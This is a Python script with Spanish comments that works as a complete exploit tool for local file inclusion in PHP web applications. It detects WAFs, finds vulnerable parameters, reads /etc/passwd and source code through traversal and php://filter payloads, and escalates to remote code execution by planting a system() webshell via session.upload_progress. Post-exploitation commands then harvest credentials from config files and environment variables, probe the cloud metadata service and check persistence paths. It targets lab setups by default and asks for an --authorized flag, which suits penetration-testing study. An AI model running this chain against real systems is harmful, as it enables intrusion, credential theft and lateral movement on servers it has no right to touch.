#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lfi_scan.py - Descubrimiento de LFI y, opcionalmente, cadena a RCE (php2shell).

SOLO para laboratorios y sistemas con autorizacion explicita.
Por defecto apunta al lab local (http://127.0.0.1:8083/index.php).
Contra un host que no sea local exige --authorized.

Fases:
  0. deteccion de WAF      -> benigno vs malicioso + cabeceras
  1. baseline              -> respuesta de referencia (sin parametro)
  2. enumeracion           -> detecta que parametro llega a include/require
  3. confirmacion          -> /etc/passwd, traversal, php://filter, data://
  4. --chain               -> session.upload_progress + LFI = RCE
  5. --post                -> impacto tras el RCE (solo lectura)

Uso:
    python3 lfi_scan.py
    python3 lfi_scan.py --target http://127.0.0.1:8083/index.php --param page
    python3 lfi_scan.py --chain --cmd "id"
    python3 lfi_scan.py --diff A E                      # tabla comparativa
    python3 lfi_scan.py --diff A E --diff-md informe.md # tabla para el informe
    python3 lfi_scan.py --target https://mi-sistema --authorized   # con permiso
"""

import argparse
import base64
import contextlib
import io
import random
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "lfi-scan/1.0 (prueba autorizada)"

# Nombres de parametro que suelen acabar en include/require/file_get_contents
CANDIDATE_PARAMS = [
    "page", "p", "pg", "file", "filename", "filepath", "path", "folder", "dir",
    "root", "doc", "document", "view", "template", "tpl", "theme", "skin",
    "lang", "language", "locale", "inc", "include", "module", "load", "read",
    "src", "content", "section", "cat", "url", "name", "action",
]

# Firmas de que el valor llego a include()/require()
ERROR_SIGNATURES = [
    "failed to open stream",
    "failed opening",
    "include(",
    "require(",
    "open_basedir restriction",
    "No such file or directory",
    "failed to open stream: Permission denied",
]

PASSWD_MARK = "root:x:0:0"

# Rutas de sesion habituales (para --chain)
SESSION_PATHS = [
    "/tmp/sessions", "/tmp", "/var/lib/php/sessions", "/var/lib/php/session",
    "/var/lib/php5", "/var/lib/php", "/var/tmp", "/dev/shm", "/run/php/sessions",
    "/var/cache/php", "/opt/lampp/temp", "/usr/local/var/lib/php/sessions",
    "/var/www/html/sessions", "/var/www/sessions",
]

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1", "0.0.0.0"}

# Escenarios del laboratorio, para poder escribir --diff A E
SCENARIOS = {
    "A": ("http://127.0.0.1:8083/index.php", "A sin WAF"),
    "B": ("http://127.0.0.1:8090/index.php", "B solo loopback"),
    "C": ("http://127.0.0.1:8088/index.php", "C con WAF"),
    "D": ("http://127.0.0.1:8089/index.php", "D codigo endurecido"),
    "E": ("http://127.0.0.1:8091/index.php", "E aislado"),
    "F": ("http://127.0.0.1:8092/index.php", "F WAF + codigo"),
    "G": ("http://127.0.0.1:8095/index.php", "G origen cerrado"),
    "CENTOS": ("http://127.0.0.1:8086/index.php", "CentOS 7 / PHP 5.4.16"),
    "WAF-CENTOS": ("http://127.0.0.1:8093/index.php", "CentOS tras WAF"),
}

# Payloads de confirmacion. (valor enviado, etiqueta, comprobacion)
PROBES = [
    ("/etc/passwd", "lectura /etc/passwd", "passwd"),
    ("../../../../../../etc/passwd", "traversal ../../../etc/passwd", "passwd"),
    ("../../../../../../../../etc/passwd", "traversal profundo", "passwd"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd",
     "wrapper php://filter (base64 de /etc/passwd)", "b64passwd"),
    ("php://filter/resource=/etc/passwd", "wrapper php://filter (raw)", "passwd"),
    ("data://text/plain;base64,PD9waHAgZWNobyAiTEZJLURBVEEiOyA/Pg==",
     "wrapper data:// (necesita allow_url_include)", "data"),
]


def rand_text(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_sid(n=26):
    # Formato por defecto de PHP: sid_length=26, bits_per_character=5 -> [0-9a-v]
    return "".join(random.choices("0123456789abcdefghijklmnopqrstuv", k=n))


def build_url(target, **params):
    """Anade/mezcla parametros de query sin romper los existentes."""
    parts = urllib.parse.urlsplit(target)
    q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    q.update({k: v for k, v in params.items() if v is not None})
    return urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(q)))


def fetch(url, timeout=8, data=None, headers=None):
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    t = time.time()
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), (time.time() - t) * 1000, None
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return e.code, body, (time.time() - t) * 1000, None
    except Exception as e:
        return None, b"", (time.time() - t) * 1000, str(e)


def summarize(body):
    return len(body), " ".join(body.decode(errors="replace").split())[:120]


WAF_STATUS = {403, 406, 429, 501, 999}


def fetch_headers(url, timeout=8):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers)
    except Exception:
        return None, {}


def detect_waf(target, timeout=8):
    """Fase 0: heuristica de WAF (misma idea que wafw00f: benigno vs malicioso)."""
    print("[*] Fase 0: deteccion de WAF")
    st_ok, _ = fetch_headers(build_url(target, **{"zz_probe": "1"}), timeout)
    st_bad, hdrs = fetch_headers(
        build_url(target, **{"zz_probe": "../../../../etc/passwd"}), timeout)
    if st_ok is None:
        print("  [-] No se pudo conectar.")
        return False
    server = hdrs.get("Server")
    if server:
        print(f"  [i] Server: {server}")
    for k, v in hdrs.items():
        if k.lower() in ("cf-ray", "x-sucuri-id", "x-akamai-request-id", "via", "x-cache"):
            print(f"  [i] {k}: {v}")
    if st_bad in WAF_STATUS and st_ok not in WAF_STATUS:
        print(f"  [+] Posible WAF: benigno HTTP {st_ok}, ataque HTTP {st_bad}")
        return True
    if st_bad != st_ok:
        print(f"  [ ?] Respuesta distinta (benigno {st_ok}, ataque {st_bad}); revisar")
        return False
    print(f"  [ ] Sin bloqueo por firma (ambos HTTP {st_ok})")
    return False


LINK_RE = re.compile(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', re.I)
FORM_RE = re.compile(r"<(?:input|select|textarea|button)\b[^>]*>", re.I)
NAME_ATTR_RE = re.compile(r'name\s*=\s*["\']([^"\']+)["\']', re.I)
PARAM_NAME_RE = re.compile(r"[A-Za-z0-9_\-\[\]]{1,40}")
STATIC_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
              ".woff", ".woff2", ".ttf", ".map")


def crawl_page(target, timeout=8):
    """Devuelve (parametros, enlaces internos) vistos en la pagina.

    Solo cuenta enlaces del mismo host (fuera Google Fonts, CDNs, etc.) y
    nombres de campos de formulario reales (no <meta name="viewport">).
    """
    st, body, _, _ = fetch(target, timeout)
    if st is None:
        return [], []
    text = body.decode(errors="replace")
    base = urllib.parse.urlsplit(target)
    params, links = [], []

    for attr in LINK_RE.findall(text):
        url = urllib.parse.urljoin(target, attr)
        parts = urllib.parse.urlsplit(url)
        if parts.scheme not in ("http", "https"):
            continue
        if parts.netloc and parts.netloc != base.netloc:
            continue
        path = parts.path or "/"
        if path.lower().endswith(STATIC_EXT):
            continue
        if path not in links:
            links.append(path)
        for key, _ in urllib.parse.parse_qsl(parts.query, keep_blank_values=True):
            if key and key not in params:
                params.append(key)

    for match in FORM_RE.finditer(text):
        for key in NAME_ATTR_RE.findall(match.group(0)):
            if key not in params:
                params.append(key)

    clean = [n for n in params if PARAM_NAME_RE.fullmatch(n)]
    return clean, links


def crawl_params(target, timeout=8):
    return crawl_page(target, timeout)[0]


def check_probe(kind, body):
    """Devuelve (confirmado, detalle) para un payload concreto."""
    text = body.decode(errors="replace")
    if kind == "passwd":
        if PASSWD_MARK in text:
            return True, "contiene " + PASSWD_MARK
        return False, ""
    if kind == "b64passwd":
        try:
            dec = base64.b64decode(text.strip(), validate=False).decode(errors="replace")
        except Exception:
            return False, ""
        if PASSWD_MARK in dec:
            return True, "base64 decodificado contiene " + PASSWD_MARK
        return False, ""
    if kind == "data":
        if "LFI-DATA" in text:
            return True, "data:// ejecutado (allow_url_include=On)"
        return False, ""
    return False, ""


def print_kv(label, value):
    print(f"    {label:<34} {value}")


def scan(target, param=None, timeout=8, candidates=None):
    """Fase 1-3. Devuelve (param_vulnerable, informe)."""
    print(f"[*] Objetivo: {target}")
    st, body, ms, err = fetch(target, timeout)
    if st is None:
        print(f"[-] No se pudo conectar: {err}")
        sys.exit(1)
    base_len, base_txt = summarize(body)
    print_kv("baseline", f"HTTP {st} | {base_len} bytes | {int(ms)} ms")
    print_kv("baseline (inicio)", base_txt)
    print()

    candidates = [param] if param else (candidates or CANDIDATE_PARAMS)
    print(f"[*] Fase 2: probando {len(candidates)} parametro(s) candidatos")

    suspects = []
    for c in candidates:
        token = "zz_" + rand_text(8) + "_nofile"
        st2, body2, ms2, err2 = fetch(build_url(target, **{c: token}), timeout)
        if st2 is None:
            continue
        text = body2.decode(errors="replace")
        hits = [s for s in ERROR_SIGNATURES if s in text]
        len2 = len(body2)
        notable = len2 != base_len or st2 != st
        if hits:
            suspects.append((c, "error de include", hits[0]))
            print(f"  [!!] {c:<12} firma: {hits[0]!r}")
        elif notable:
            print(f"  [ ?] {c:<12} respuesta distinta (len {len2} vs {base_len})")

    if param and not suspects:
        print(f"  [!] '{param}' no dio firma de include (errores ocultos?); "
              f"probando lectura igualmente")
        suspects.append((param, "forzado por --param", ""))

    print()
    print("[*] Fase 3: confirmacion de lectura de ficheros")
    vulnerable = []

    for c, reason, sig in suspects:
        print(f"  -- parametro '{c}' ({reason}) --")
        for value, label, kind in PROBES:
            st3, body3, ms3, err3 = fetch(build_url(target, **{c: value}), timeout)
            ok, detail = (False, "")
            if st3 is not None:
                ok, detail = check_probe(kind, body3)
            tag = "[+] CONFIRMADO" if ok else "[ ]"
            print(f"     {tag} {label}")
            if ok:
                print_kv("detalle", detail)
                vulnerable.append((c, value, label, detail))

    # Fuente del script (divulgacion de codigo)
    m = re.search(r"in <b>([^<]+\.php)</b>", (body2 or b"").decode(errors="replace")) if suspects else None
    if suspects:
        c = suspects[0][0]
        for resource in ["index.php", "config.php"]:
            v = f"php://filter/convert.base64-encode/resource={resource}"
            st4, body4, _, _ = fetch(build_url(target, **{c: v}), timeout)
            if st4 is None:
                continue
            try:
                dec = base64.b64decode(body4.decode(errors="replace").strip(), validate=False)
            except Exception:
                continue
            if b"<?php" in dec:
                print(f"  [+] Codigo fuente de {resource} obtenido ({len(dec)} bytes)")
                print("  " + "-" * 60)
                for line in dec.decode(errors="replace").splitlines()[:25]:
                    print("  | " + line)
                print("  " + "-" * 60)
                break

    print()
    if vulnerable:
        print(f"[+] LFI CONFIRMADO ({len(vulnerable)} prueba(s) positiva(s))")
        print(f"    Parametro: {vulnerable[0][0]}")
        for p in vulnerable:
            print(f"    - {p[2]}: {p[3]}")
    elif suspects:
        forced = param and any(s[1].startswith("forzado") for s in suspects)
        if forced:
            print(f"[!] '{param}' no leyo ningun fichero de prueba. O no es el parametro, "
                  "o hay prefijo/sufijo, allowlist u open_basedir.")
        else:
            print("[!] Hay senales de include pero sin lectura confirmada "
                  "(posible allowlist, sufijo forzado u open_basedir).")
    else:
        print("[-] No se detecto LFI con las sondas usadas (no significa que no exista).")

    return (vulnerable[0][0] if vulnerable else None)


def chain(target, param, session_name, session_paths, cmd, timeout=8):
    """Fase 4: session.upload_progress + LFI -> RCE. Solo contra el lab/objetivo autorizado."""
    print()
    print("[*] Fase 4: cadena session.upload_progress -> RCE")
    sid = rand_sid()
    payload = "<?php echo '===RCE==='; system($_GET['c']); die(); ?>"

    boundary = "----lfi" + rand_text(10)
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{session_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{payload}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        f"Content-Type: text/plain\r\n\r\nZ\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    st, _, _, err = fetch(
        target, timeout, data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie": f"{session_name}={sid}",
        },
    )
    if st is None:
        print(f"[-] Fallo en la inyeccion: {err}")
        return None
    print_kv("inyeccion", f"HTTP {st} | SID {sid}")

    for base in session_paths:
        sess_file = f"{base}/sess_{sid}"
        url = build_url(target, **{param: sess_file, "c": cmd})
        st2, body2, ms2, err2 = fetch(url, timeout)
        if st2 is None:
            continue
        text = body2.decode(errors="replace")
        if "===RCE===" in text:
            out = text.split("===RCE===", 1)[-1].strip()
            print(f"  [+] RCE en {sess_file} ({int(ms2)} ms)")
            print("  " + "-" * 60)
            print(out if out else "(sin salida)")
            print("  " + "-" * 60)
            return sess_file
    print("[-] No se ejecuto el payload. Prueba con --session-path con la ruta correcta.")
    return None


# Comprobaciones de SOLO LECTURA tras un RCE. No escriben, no persisten, no exfiltran.
POST_CHECKS = [
    ("identidad", "id; hostname; uname -sr"),
    ("sistema", "cat /etc/os-release 2>/dev/null | head -3"),
    ("php", "php -v 2>/dev/null | head -1"),
    ("hardening", "php -i 2>/dev/null | grep -E 'open_basedir|disable_functions' | head -4"),
    ("webroot", "ls -la /var/www/html 2>/dev/null | head -10"),
    ("ficheros-sensibles",
     "find /var/www/html -maxdepth 2 \\( -name .env -o -name wp-config.php "
     "-o -name configuration.php -o -name config.php \\) 2>/dev/null | head -5"),
    ("credenciales",
     "for f in .env configuration.php config.php; do "
     "[ -f /var/www/html/$f ] && { echo --- $f; "
     "grep -iE 'pass|secret|token|key|user' /var/www/html/$f | head -4; }; done"),
    ("variables-entorno",
     "env 2>/dev/null | grep -iE 'pass|secret|token|api_?key|app_?key|db_' | head -5"),
    ("red", "hostname -I 2>/dev/null; grep -i nameserver /etc/resolv.conf 2>/dev/null | head -2"),
    ("puertos",
     "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null "
     "| awk '$4 == \"0A\" {print $2}' | sort -u | head -12"),
    ("sudo", "sudo -n -l 2>&1 | head -3"),
    ("pivote-interno",
     "php -r 'echo @file_get_contents(\"http://internal/\") ? \"INTERNO-SI\" : \"INTERNO-NO\";'"),
    ("egress-internet",
     "php -r 'echo @fsockopen(\"1.1.1.1\", 80, $e, $s, 2) ? \"INTERNET-SI\" : \"INTERNET-NO\";'"),
    ("metadata-cloud",
     "php -r '$c=@file_get_contents(\"http://169.254.169.254/latest/meta-data/\", false, "
     "stream_context_create([\"http\" => [\"timeout\" => 1]])); "
     "echo $c ? \"METADATA-SI\" : \"METADATA-NO\";'"),
    ("escritura",
     "test -w /var/www/html && echo WEBROOT-ESCRIBIBLE || echo WEBROOT-SOLO-LECTURA"),
    ("persistencia",
     "(command -v crontab >/dev/null && crontab -l 2>&1 | head -3) ; "
     "ls /etc/cron.d /var/spool/cron 2>/dev/null | head -6 ; "
     "ls -la /var/run/docker.sock 2>/dev/null ; "
     "ls -la $HOME/.ssh 2>/dev/null | head -3"),
]

COMMON_PORTS = {
    22: "ssh", 80: "http", 443: "https", 3306: "mysql", 5432: "postgres",
    6379: "redis", 8080: "http-alt", 11211: "memcached",
}


def format_ports(raw):
    """Convierte los puertos hex de /proc/net/tcp a algo legible."""
    entries = []
    for token in raw.split():
        if token.count(":") != 1:
            continue
        addr, port_hex = token.split(":")
        try:
            port = int(port_hex, 16)
            octets = [str(int(addr[i:i + 2], 16)) for i in (6, 4, 2, 0)]
        except ValueError:
            continue
        entries.append((port, ".".join(octets)))
    if not entries:
        return raw or "(vacio)"

    # Los servicios utiles son los alcanzables; los de loopback solo si no hay otros.
    routable = [e for e in entries if not e[1].startswith("127.")]
    items = []
    for port, ip in sorted(set(routable or entries)):
        name = COMMON_PORTS.get(port)
        label = f"{port} ({name})" if name else str(port)
        if ip not in ("0.0.0.0", "::"):
            label += f"@{ip}"
        items.append(label)
    return " ".join(items)


def collect_post(target, param, sess_file, timeout=8):
    """Ejecuta las comprobaciones y devuelve {etiqueta: salida} (solo lectura)."""
    data = {}
    for label, cmd in POST_CHECKS:
        url = build_url(target, **{param: sess_file, "c": cmd})
        st, body, ms, err = fetch(url, timeout)
        text = body.decode(errors="replace")
        if "===RCE===" not in text:
            data[label] = None
            continue
        out = text.split("===RCE===", 1)[-1].strip()
        if label == "puertos":
            out = format_ports(out)
        data[label] = out
    return data


def post_exploit(target, param, sess_file, timeout=8):
    """Fase 5: que se puede ver desde dentro una vez obtenido el RCE."""
    print()
    print("[*] Fase 5: post-explotacion (solo lectura, no escribe nada)")
    print(f"    sesion reutilizada: {sess_file}")
    data = collect_post(target, param, sess_file, timeout)
    for label, _ in POST_CHECKS:
        out = data.get(label)
        if out is None:
            print(f"  [{label}] (sin respuesta)")
            continue
        print(f"  [{label}]")
        for line in (out or "(vacio)").splitlines()[:16]:
            print("    " + line)


KEY_MEANING = {
    "pivote-interno": "alcanza la red interna = movimiento lateral a BD/ERP/AD",
    "egress-internet": "puede salir a Internet = reverse shell y exfiltracion",
    "escritura": "webroot escribible = webshell persistente",
    "metadata-cloud": "metadata de nube = robo de credenciales IAM",
    "hardening": "open_basedir/disable_functions = contencion dentro de PHP",
    "credenciales": "credenciales de BD/API a la vista = salto a otros sistemas",
    "persistencia": "cron/docker.sock/SSH = persistencia y escape del contenedor",
    "variables-entorno": "secretos en el entorno del proceso",
}

IP_RE = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
SERVICE_RE = re.compile(r"\b\d+ \([a-z-]+\)")


def diff_key(label, value):
    """Normaliza lo que es ruido de ejecucion (hostname, puerto efimero, IP)."""
    if label == "webroot":
        for line in (value or "").splitlines():
            if line.rstrip().endswith(" ."):
                return " ".join(line.split()[:3])
    text = squash(value)
    if label == "identidad":
        return text.split(" ")[0] if text else ""
    if label == "red":
        ips = [ip for ip in IP_RE.findall(text) if not ip.startswith("127.")]
        return f"{len(ips)} interfaces"
    if label == "puertos":
        return " ".join(sorted(SERVICE_RE.findall(text))) or text
    if label == "sudo" and "not found" in text:
        return "sudo no disponible"
    return text


def resolve_target(value):
    """Acepta 'A', 'CENTOS', un puerto (8083) o una URL completa."""
    key = value.strip().upper()
    if key in SCENARIOS:
        return SCENARIOS[key][0], SCENARIOS[key][1]
    if value.strip().isdigit():
        return f"http://127.0.0.1:{value.strip()}/index.php", f"puerto {value.strip()}"
    if "://" in value:
        parts = urllib.parse.urlsplit(value)
        return value, f"{parts.hostname}:{parts.port or ''}".rstrip(":")
    raise SystemExit(f"[!] No entiendo '{value}'. Usa A..G, CENTOS, un puerto o una URL.")


def run_scenario(target, param, session_paths, cmd, session_name, timeout, crawl=False):
    """Ejecuta fases 0-5 en silencio y devuelve lo esencial (para --diff)."""
    result = {"target": target, "waf": False, "param": None, "rce": None,
              "post": {}, "log": ""}
    buf = io.StringIO()
    try:
        with contextlib.redirect_stdout(buf):
            result["waf"] = detect_waf(target, timeout)
            candidates = None
            if crawl:
                found, links = crawl_page(target, timeout)
                candidates = found + [c for c in CANDIDATE_PARAMS if c not in found]
                print(f"[*] Parametros encontrados en la pagina: "
                      f"{', '.join(found) or '(ninguno)'}")
                print(f"[*] Enlaces internos: {', '.join(links[:15]) or '(ninguno)'}")
            found_param = scan(target, param, timeout, candidates)
            effective = found_param or param
            result["param"] = effective
            if effective:
                sess = chain(target, effective, session_name, session_paths,
                             cmd, timeout)
                result["rce"] = sess
                if sess:
                    result["post"] = collect_post(target, effective, sess, timeout)
    except SystemExit:
        pass
    except Exception as e:  # noqa: BLE001 - el informe debe salir igualmente
        buf.write(f"\n[!] Error inesperado: {e}\n")
    result["log"] = buf.getvalue()
    return result


def squash(text):
    return " ".join((text or "").split())


def short(text, width):
    line = squash(text) or "(vacio)"
    return line if len(line) <= width else line[:width - 3] + "..."


def diff_report(a, b, name_a, name_b, markdown_path=None):
    """Tabla comparativa A vs B + detalle de lo que cambia."""
    labels = [label for label, _ in POST_CHECKS]
    col = 30
    diffs = []

    print()
    print("=" * 84)
    print(" COMPARATIVA DE IMPACTO")
    print("=" * 84)
    for tag, res, name in (("A", a, name_a), ("B", b, name_b)):
        estado = "RCE OK" if res["rce"] else "sin RCE"
        waf = "WAF detectado" if res["waf"] else "sin WAF"
        print(f"  {tag}) {name:<26} {res['target']}")
        print(f"     {waf} | {estado}")
    print()

    if not a["rce"] or not b["rce"]:
        print("[!] La comparacion necesita RCE en ambos objetivos.")
        for tag, res in (("A", a), ("B", b)):
            if not res["rce"]:
                print(f"    {tag}) sin RCE: revisa --param/--session-path.")
        return

    print(f" {'comprobacion':<19}   {'A':<{col}} {'B':<{col}}")
    print(" " + "-" * (19 + 2 + col + 1 + col))
    for label in labels:
        va, vb = a["post"].get(label), b["post"].get(label)
        same = diff_key(label, va) == diff_key(label, vb)
        if not same:
            diffs.append(label)
        mark = " " if same else "*"
        print(f" {label:<19} {mark} {short(va, col):<{col}} {short(vb, col):<{col}}")
    print()
    print(f" {len(diffs)} de {len(labels)} comprobaciones difieren   (* = difiere)")
    print()

    if diffs:
        print("[*] Detalle de lo que cambia")
        for label in diffs:
            print(f"  [{label}]")
            for tag, res, name in (("A", a, name_a), ("B", b, name_b)):
                out = (res["post"].get(label) or "(vacio)").strip()
                first = True
                for line in out.splitlines()[:10]:
                    prefix = f"    {tag}) " if first else "       "
                    print(prefix + line)
                    first = False
            meaning = KEY_MEANING.get(label)
            if meaning:
                print(f"       -> {meaning}")
        print()

    if markdown_path:
        write_markdown(markdown_path, a, b, name_a, name_b, labels, diffs)
        print(f"[+] Tabla markdown escrita en {markdown_path}")


def write_markdown(path, a, b, name_a, name_b, labels, diffs):
    def cell(value):
        return short(value, 120).replace("|", "\\|") or "(vacio)"

    lines = [
        "# Comparativa de impacto (LFI -> RCE)",
        "",
        f"- A: `{name_a}` — {a['target']}",
        f"- B: `{name_b}` — {b['target']}",
        f"- WAF: A {'si' if a['waf'] else 'no'} / B {'si' if b['waf'] else 'no'}",
        f"- Parametro LFI: `{a['param']}` / `{b['param']}`",
        f"- Fecha: {time.strftime('%Y-%m-%d %H:%M')}",
        "",
        "| Comprobacion | A | B | Cambia |",
        "|---|---|---|---|",
    ]
    for label in labels:
        va, vb = a["post"].get(label), b["post"].get(label)
        cambia = "si" if diff_key(label, va) != diff_key(label, vb) else ""
        lines.append(f"| {label} | {cell(va)} | {cell(vb)} | {cambia} |")
    lines += ["", "> Comprobaciones de solo lectura. Los valores del laboratorio no son reales.", ""]
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))


def main():
    ap = argparse.ArgumentParser(
        description="Descubrimiento de LFI (+ cadena RCE opcional). Solo objetivos autorizados.")
    ap.add_argument("--target", default="http://127.0.0.1:8083/index.php",
                    help="URL objetivo (por defecto el lab local)")
    ap.add_argument("--param", help="probar solo este parametro (si no, lista de candidatos)")
    ap.add_argument("--authorized", action="store_true",
                    help="confirma que tienes permiso para probar un objetivo no local")
    ap.add_argument("--timeout", type=float, default=8)
    ap.add_argument("--chain", action="store_true", help="intentar la cadena hasta RCE")
    ap.add_argument("--post", action="store_true",
                    help="tras el RCE, ejecutar comprobaciones de solo lectura (impacto)")
    ap.add_argument("--cmd", default="id", help="comando para --chain")
    ap.add_argument("--session-name", default="PHPSESSID", help="nombre de la cookie de sesion")
    ap.add_argument("--session-path", action="append",
                    help="ruta(s) de sesiones a probar (se pueden repetir); por defecto, lista comun")
    ap.add_argument("--crawl", action="store_true",
                    help="sacar nombres de parametro de los enlaces/formularios de la pagina")
    ap.add_argument("--diff", nargs=2, metavar=("A", "B"),
                    help="comparar el impacto en dos objetivos (A..G, CENTOS, puerto o URL); "
                         "implica --chain --post")
    ap.add_argument("--diff-md", metavar="FICHERO",
                    help="con --diff: escribe la tabla comparativa en markdown")
    ap.add_argument("--diff-log", action="store_true",
                    help="con --diff: muestra tambien la salida completa de cada objetivo")
    args = ap.parse_args()

    for value in (args.diff or []):
        url, _ = resolve_target(value)
        host = urllib.parse.urlsplit(url).hostname or ""
        if host not in LOCAL_HOSTS and not args.authorized:
            print("[!] Objetivo no local y sin --authorized. Abortado.")
            print("    Este script es para laboratorios y pruebas con permiso explicito.")
            sys.exit(2)

    if args.diff_md and not args.diff:
        print("[!] --diff-md necesita --diff; se ignora.")

    if args.diff:
        (url_a, name_a), (url_b, name_b) = (resolve_target(v) for v in args.diff)
        param = args.param
        paths = args.session_path or SESSION_PATHS
        res_a = run_scenario(url_a, param, paths, args.cmd, args.session_name,
                             args.timeout, args.crawl)
        res_b = run_scenario(url_b, param, paths, args.cmd, args.session_name,
                             args.timeout, args.crawl)
        if args.diff_log:
            for tag, res, name in (("A", res_a, name_a), ("B", res_b, name_b)):
                print("=" * 84)
                print(f" {tag}) {name} - salida completa")
                print("=" * 84)
                print(res["log"].rstrip())
                print()
        diff_report(res_a, res_b, name_a, name_b, args.diff_md)
        return

    host = urllib.parse.urlsplit(args.target).hostname or ""
    if host not in LOCAL_HOSTS and not args.authorized:
        print("[!] Objetivo no local y sin --authorized. Abortado.")
        print("    Este script es para laboratorios y pruebas con permiso explicito.")
        sys.exit(2)

    detect_waf(args.target, args.timeout)
    print()
    candidates = None
    if args.crawl:
        found, links = crawl_page(args.target, args.timeout)
        print(f"[*] Parametros encontrados en la pagina ({len(found)}): "
              f"{', '.join(found[:25]) or '(ninguno)'}")
        if links:
            print(f"[*] Enlaces internos ({len(links)}): "
                  f"{', '.join(links[:15])}{' ...' if len(links) > 15 else ''}")
        print()
        candidates = found + [c for c in CANDIDATE_PARAMS if c not in found]
    param = scan(args.target, args.param, args.timeout, candidates)
    if args.chain:
        # Si el usuario indico --param, se respeta aunque la confirmacion falle
        # (p.ej. un WAF bloquea las sondas pero la app sigue siendo vulnerable).
        effective = param or args.param
        if not effective:
            print("[-] Sin parametro LFI confirmado; no hay cadena que montar.")
            print("    Usa --param si ya sabes cual es.")
            sys.exit(1)
        sess_file = chain(args.target, effective, args.session_name,
                          args.session_path or SESSION_PATHS, args.cmd, args.timeout)
        if args.post:
            if sess_file:
                post_exploit(args.target, effective, sess_file, args.timeout)
            else:
                print("[-] --post requiere un RCE exitoso.")


if __name__ == "__main__":
    main()
